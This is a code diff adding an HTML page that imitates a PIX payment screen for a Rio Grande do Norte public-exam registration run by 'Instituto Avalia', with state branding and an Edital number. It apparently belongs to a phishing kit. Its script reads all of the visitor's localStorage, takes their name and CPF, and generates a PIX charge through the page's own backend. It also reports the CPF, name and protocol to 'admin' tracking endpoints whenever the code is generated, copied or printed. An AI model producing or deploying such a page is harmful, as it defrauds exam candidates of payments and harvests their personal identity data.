@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pagamento PIX - Instituto Avalia</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Roboto', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+    background: #f4f6f8;
+    color: #151515;
+    line-height: 1.5;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* Header */
+  .header { background: white; border-bottom: 1px solid #e5e7eb; padding: 14px 0; box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
+  .header-inner { max-width: 1200px; margin: 0 auto; padding: 0 24px; display: flex; justify-content: space-between; align-items: center; }
+  .logo { display: flex; align-items: center; gap: 8px; }
+  .logo-mark { width: 56px; height: 56px; flex-shrink: 0; }
+  .logo-mark svg { width: 100%; height: 100%; display: block; }
+  .logo-text { display: flex; flex-direction: column; line-height: 1; }
+  .logo-text .instituto { font-size: 12px; color: #2e8b57; font-weight: 400; letter-spacing: 2px; text-transform: uppercase; }
+  .logo-text .avalia { font-size: 28px; color: #1e5aa8; font-weight: 700; letter-spacing: -0.5px; line-height: 1; margin-top: 2px; }
+  .btn-sair { background: #2c6a9e; color: white; border: none; padding: 12px 34px; border-radius: 4px; font-weight: 700; font-size: 14px; cursor: pointer; letter-spacing: 1px; transition: background 0.2s; }
+  .btn-sair:hover { background: #235882; }
+
+  /* Container */
+  .container { max-width: 960px; margin: 32px auto; padding: 0 24px; }
+
+  /* Card SECRETARIA */
+  .card-secretaria { background: white; border: 1px solid #e5e7eb; border-radius: 6px; padding: 20px 32px; margin-bottom: 24px; }
+  .card-secretaria h1 { font-size: 20px; font-weight: 700; color: #151515; padding-bottom: 16px; border-bottom: 1px solid #e5e7eb; margin-bottom: 16px; line-height: 1.3; }
+  .edital-row { display: flex; align-items: center; gap: 24px; }
+  .brasao-rn { display: flex; align-items: center; gap: 10px; background: white; padding: 4px 12px; border: 1px solid #d1d5db; border-radius: 4px; }
+  .brasao-rn svg { width: 44px; height: 44px; flex-shrink: 0; }
+  .brasao-rn .brasao-text { display: flex; flex-direction: column; line-height: 1.1; }
+  .brasao-rn .brasao-title { font-size: 11px; font-weight: 900; color: #111; }
+  .brasao-rn .brasao-sub { font-size: 7px; font-weight: 500; color: #444; letter-spacing: 1.5px; margin-top: 2px; }
+  .edital-row .edital-label { font-size: 15px; font-weight: 600; color: #333; }
+
+  /* Section title */
+  .section-title { font-size: 22px; font-weight: 400; color: #999; margin: 24px 0 16px; }
+
+  /* Card PIX */
+  .pix-card { background: white; border: 1px solid #e5e7eb; border-radius: 8px; padding: 28px 32px; margin-bottom: 24px; }
+  .pix-card h2 { font-size: 14px; font-weight: 600; color: #151515; text-transform: uppercase; letter-spacing: 0.08em; padding-bottom: 12px; border-bottom: 1px solid #e5e7eb; margin-bottom: 18px; }
+
+  .pix-info { display: flex; gap: 32px; flex-wrap: wrap; align-items: flex-start; }
+  .pix-qr-side { flex: 0 0 auto; text-align: center; }
+  .qr-frame { display: inline-block; padding: 12px; background: white; border: 2px solid #16a34a; border-radius: 12px; box-shadow: 0 4px 12px rgba(22,163,74,0.15); }
+  .qr-frame img, .qr-frame canvas { display: block; width: 220px; height: 220px; }
+  .qr-hint { margin-top: 10px; font-size: 12px; color: #666; }
+
+  .pix-details-side { flex: 1 1 300px; min-width: 260px; }
+  .pix-row { display: flex; padding: 8px 0; border-bottom: 1px solid #f0f0f0; align-items: baseline; gap: 12px; }
+  .pix-row:last-child { border-bottom: none; }
+  .pix-label { flex: 0 0 140px; color: #151515; font-size: 13px; font-weight: 500; }
+  .pix-value { flex: 1; color: #666; font-size: 13px; word-break: break-word; }
+  .pix-value.valor { font-size: 22px; font-weight: 700; color: #16a34a; }
+  .pix-value.status .badge { display:inline-block; background:#fef3c7; color:#92400e; padding:3px 10px; border-radius:999px; font-size:12px; font-weight:600; }
+
+  /* Código PIX copia-e-cola */
+  .pix-code-box { margin-top: 18px; padding: 14px 16px; background: #f9fafb; border: 1px dashed #d1d5db; border-radius: 6px; word-break: break-all; font-family: 'Courier New', monospace; font-size: 12px; color: #333; max-height: 90px; overflow-y: auto; }
+
+  /* Botões */
+  .btn-group { display: flex; gap: 12px; margin-top: 20px; flex-wrap: wrap; }
+  .btn { flex: 1; min-width: 200px; padding: 14px 20px; border: none; border-radius: 6px; font-weight: 700; font-size: 14px; text-transform: uppercase; letter-spacing: 0.8px; cursor: pointer; transition: all 0.2s; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
+  .btn-primary { background: #16a34a; color: white; box-shadow: 0 2px 6px rgba(22,163,74,0.25); }
+  .btn-primary:hover { background: #15803d; }
+  .btn-secondary { background: #2c6a9e; color: white; box-shadow: 0 2px 6px rgba(44,106,158,0.25); }
+  .btn-secondary:hover { background: #235882; }
+  .btn:active { transform: translateY(1px); }
+
+  /* SAIR */
+  .sair-wrap { display: flex; justify-content: center; margin: 32px 0 48px; }
+  .btn-sair-bottom { background: #e57373; color: white; border: none; padding: 12px 34px; border-radius: 4px; font-weight: 700; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; cursor: pointer; }
+  .btn-sair-bottom:hover { background: #d15656; }
+
+  /* Toast */
+  .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: #16a34a; color: white; padding: 12px 24px; border-radius: 6px; font-size: 14px; font-weight: 500; box-shadow: 0 4px 12px rgba(0,0,0,0.2); opacity: 0; transition: opacity 0.3s; z-index: 9999; }
+  .toast.show { opacity: 1; }
+
+  @media (max-width: 640px) {
+    .container { padding: 0 12px; margin: 16px auto; }
+    .card-secretaria, .pix-card { padding: 16px 18px; }
+    .pix-info { flex-direction: column; gap: 20px; }
+    .pix-details-side { width: 100%; }
+    .qr-frame img, .qr-frame canvas { width: 180px; height: 180px; }
+    .btn { min-width: 100%; }
+    .card-secretaria h1 { font-size: 16px; }
+    .pix-row { flex-direction: column; gap: 4px; }
+    .pix-label { flex: none; }
+  }
+
+  /* Print */
+  @media print {
+    .header, .sair-wrap, .btn-group { display: none !important; }
+    body { background: white; }
+    .pix-card, .card-secretaria { border: 1px solid #ccc; box-shadow: none; }
+  }
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-inner">
+    <div class="logo" aria-label="Instituto Avalia">
+      <div class="logo-mark">
+        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+          <path d="M 10 88 L 50 12 L 50 40 L 30 88 Z" fill="#2e8b57"/>
+          <path d="M 50 12 L 90 88 L 70 88 L 50 40 Z" fill="#1e5aa8"/>
+          <path d="M 50 40 L 60 60 L 50 80 L 40 60 Z" fill="#2e8b57" opacity="0.7"/>
+        </svg>
+      </div>
+      <div class="logo-text">
+        <span class="instituto">INSTITUTO</span>
+        <span class="avalia">avalia</span>
+      </div>
+    </div>
+    <button class="btn-sair" onclick="sair()" data-testid="btn-sair-top">SAIR</button>
+  </div>
+</header>
+
+<main class="container">
+
+  <div class="card-secretaria">
+    <h1>SECRETARIA DE ESTADO DA ADMINISTRAÇÃO DO RIO GRANDE DO NORTE/RN</h1>
+    <div class="edital-row">
+      <div class="brasao-rn">
+        <svg viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
+          <path d="M 8 8 L 52 8 L 52 40 Q 52 52 30 56 Q 8 52 8 40 Z" fill="#e8f4ea" stroke="#333" stroke-width="1"/>
+          <circle cx="20" cy="20" r="4" fill="#f9c74f"/>
+          <g stroke="#f9c74f" stroke-width="1.2" stroke-linecap="round">
+            <line x1="20" y1="12" x2="20" y2="14"/><line x1="20" y1="26" x2="20" y2="28"/>
+            <line x1="12" y1="20" x2="14" y2="20"/><line x1="26" y1="20" x2="28" y2="20"/>
+            <line x1="14.5" y1="14.5" x2="16" y2="16"/><line x1="24" y1="24" x2="25.5" y2="25.5"/>
+            <line x1="25.5" y1="14.5" x2="24" y2="16"/><line x1="16" y1="24" x2="14.5" y2="25.5"/>
+          </g>
+          <g fill="#2e7d32">
+            <path d="M 38 18 Q 32 22 32 28 M 38 18 Q 44 22 44 28 M 38 18 Q 34 24 36 32 M 38 18 Q 42 24 40 32 M 38 18 Q 38 22 38 32"/>
+            <rect x="37" y="30" width="2" height="14" fill="#8b6a3f"/>
+          </g>
+          <path d="M 10 44 Q 15 42 20 44 T 30 44 T 40 44 T 50 44" fill="none" stroke="#1e5aa8" stroke-width="1"/>
+          <path d="M 10 48 Q 15 46 20 48 T 30 48 T 40 48 T 50 48" fill="none" stroke="#1e5aa8" stroke-width="1"/>
+        </svg>
+        <div class="brasao-text">
+          <span class="brasao-title">RIO GRANDE</span>
+          <span class="brasao-title">DO NORTE</span>
+          <span class="brasao-sub">GOVERNO DO ESTADO</span>
+        </div>
+      </div>
+      <div class="edital-label">Edital : 002/2026</div>
+    </div>
+  </div>
+
+  <h2 class="section-title">Pagamento via PIX</h2>
+
+  <div class="pix-card">
+    <h2>Informações do Pagamento</h2>
+
+    <div class="pix-info">
+      <div class="pix-qr-side">
+        <div class="qr-frame" id="qr-frame">
+          <div id="qr-loader" style="width:220px;height:220px;display:flex;align-items:center;justify-content:center;color:#999;font-size:13px">Carregando QR…</div>
+        </div>
+        <div class="qr-hint">Escaneie com o app do seu banco</div>
+      </div>
+
+      <div class="pix-details-side">
+        <div class="pix-row">
+          <div class="pix-label">Nome</div>
+          <div class="pix-value" id="p-nome">—</div>
+        </div>
+        <div class="pix-row">
+          <div class="pix-label">CPF</div>
+          <div class="pix-value" id="p-cpf">—</div>
+        </div>
+        <div class="pix-row">
+          <div class="pix-label">Nº inscrição</div>
+          <div class="pix-value" id="p-numero">—</div>
+        </div>
+        <div class="pix-row">
+          <div class="pix-label">Cargo</div>
+          <div class="pix-value" id="p-cargo">—</div>
+        </div>
+        <div class="pix-row">
+          <div class="pix-label">Status</div>
+          <div class="pix-value status"><span class="badge">Aguardando pagamento</span></div>
+        </div>
+        <div class="pix-row">
+          <div class="pix-label">Valor</div>
+          <div class="pix-value valor" id="p-valor">R$ 0,00</div>
+        </div>
+      </div>
+    </div>
+
+    <div style="margin-top:20px">
+      <div style="font-size:13px;font-weight:500;color:#151515;margin-bottom:6px">Código PIX (copia-e-cola):</div>
+      <div class="pix-code-box" id="pix-code">Gerando código PIX…</div>
+    </div>
+
+    <div class="btn-group">
+      <button class="btn btn-primary" onclick="copiarPix()" data-testid="btn-copiar-pix" id="btn-copiar">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+        COPIAR CÓDIGO PIX
+      </button>
+      <button class="btn btn-secondary" onclick="imprimir()" data-testid="btn-imprimir-pagamento">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect x="6" y="14" width="12" height="8"/></svg>
+        IMPRIMIR PAGAMENTO
+      </button>
+    </div>
+  </div>
+
+  <div class="sair-wrap">
+    <button class="btn-sair-bottom" onclick="sair()" data-testid="btn-sair-bottom">SAIR</button>
+  </div>
+
+</main>
+
+<div class="toast" id="toast">Código copiado!</div>
+
+<script>
+(function(){
+  var API = window.REACT_APP_BACKEND_URL || window.location.origin;
+
+  function readLS(){
+    var out = {};
+    try {
+      for(var i=0; i<localStorage.length; i++){
+        var k = localStorage.key(i);
+        if(!k) continue;
+        var v = localStorage.getItem(k);
+        try { v = JSON.parse(v); } catch(e){}
+        if(v && typeof v === 'object'){ Object.keys(v).forEach(function(kk){ out[kk] = v[kk]; }); }
+        else out[k] = v;
+      }
+    } catch(e){}
+    return out;
+  }
+
+  var d = readLS();
+  var nome = d['formly_16_input_nome_1'] || '—';
+  var cpf = d['formly_16_input-mask_cpf_0'] || '—';
+  var protocolo = d.__protocolo || localStorage.getItem('__protocolo') || '—';
+  var cargoTxt = d.__cargo_label || localStorage.getItem('__cargo_label') || '—';
+  var valorStr = d.__valor_inscricao || localStorage.getItem('__valor_inscricao') || 'R$ 130,00';
+  var valorNum = parseFloat(d.__valor_inscricao_num || localStorage.getItem('__valor_inscricao_num') || '130.00');
+
+  // Preenche
+  document.getElementById('p-nome').textContent = nome;
+  document.getElementById('p-cpf').textContent = cpf;
+  document.getElementById('p-numero').textContent = protocolo;
+  document.getElementById('p-cargo').textContent = cargoTxt;
+  document.getElementById('p-valor').textContent = valorStr;
+
+  var pixCode = '';
+
+  // Gera QR code no backend
+  function gerarPix(){
+    var cpfDigitos = (cpf || '').replace(/\D/g,'');
+    var body = {
+      valor: valorNum,
+      txid: 'INSC' + (protocolo || '').replace(/\D/g,'').slice(0,20).padEnd(6,'0'),
+      info: 'Inscricao ' + (cargoTxt || '').substring(0, 30),
+      cpf: cpfDigitos,
+      cargo_codigo: (cargoTxt.match(/^(\d+)/) || [,''])[1]
+    };
+    fetch(API + '/api/pix/generate', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(body)
+    }).then(function(res){ return res.json(); })
+    .then(function(data){
+      if(data.pix_code){
+        pixCode = data.pix_code;
+        document.getElementById('pix-code').textContent = pixCode;
+      }
+      if(data.qr_png_base64){
+        var loader = document.getElementById('qr-loader');
+        if(loader) loader.remove();
+        var img = document.createElement('img');
+        img.src = 'data:image/png;base64,' + data.qr_png_base64;
+        img.alt = 'QR Code PIX';
+        document.getElementById('qr-frame').appendChild(img);
+      }
+      // Registra no admin que PIX foi gerado
+      registrarPixGerado(cpfDigitos, nome, protocolo, valorNum);
+    }).catch(function(err){
+      document.getElementById('pix-code').textContent = 'Erro ao gerar PIX. Recarregue a página.';
+      var loader = document.getElementById('qr-loader');
+      if(loader) loader.textContent = 'Erro ao carregar';
+      console.error('[pix]', err);
+    });
+  }
+
+  function registrarPixGerado(cpf, nome, protocolo, valor){
+    fetch(API + '/api/track/pix-generated', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        page: '/inscricao/pagamento/pix',
+        user_agent: navigator.userAgent,
+        extra: {cpf: cpf, nome: nome, protocolo: protocolo, valor: valor}
+      })
+    }).catch(function(){});
+  }
+
+  window.copiarPix = function(){
+    if(!pixCode) return;
+    var cpfDigitos = (cpf || '').replace(/\D/g,'');
+    // Tenta clipboard API moderna
+    if(navigator.clipboard && navigator.clipboard.writeText){
+      navigator.clipboard.writeText(pixCode).then(function(){
+        showToast('Código PIX copiado!');
+        // Registra evento no admin
+        fetch(API + '/api/track/pix-copied', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            page: '/inscricao/pagamento/pix',
+            user_agent: navigator.userAgent,
+            extra: {cpf: cpfDigitos, nome: nome, protocolo: protocolo, valor: valorNum}
+          })
+        }).catch(function(){});
+      }).catch(fallback);
+    } else fallback();
+
+    function fallback(){
+      var ta = document.createElement('textarea');
+      ta.value = pixCode;
+      document.body.appendChild(ta);
+      ta.select();
+      try { document.execCommand('copy'); showToast('Código PIX copiado!'); } catch(e){}
+      document.body.removeChild(ta);
+    }
+  };
+
+  window.imprimir = function(){
+    // Registra download/impressão
+    fetch(API + '/api/track/pix-downloaded', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        page: '/inscricao/pagamento/pix',
+        user_agent: navigator.userAgent,
+        extra: {cpf: (cpf||'').replace(/\D/g,''), nome: nome, protocolo: protocolo, valor: valorNum}
+      })
+    }).catch(function(){});
+    setTimeout(function(){ window.print(); }, 200);
+  };
+
+  window.sair = function(){
+    if(confirm('Deseja realmente sair?')){
+      window.location.href = '/';
+    }
+  };
+
+  function showToast(msg){
+    var t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(function(){ t.classList.remove('show'); }, 2500);
+  }
+
+  // Inicia
+  if(document.readyState === 'loading') document.addEventListener('DOMContentLoaded', gerarPix);
+  else gerarPix();
+})();
+</script>
+
+</body>
+</html>
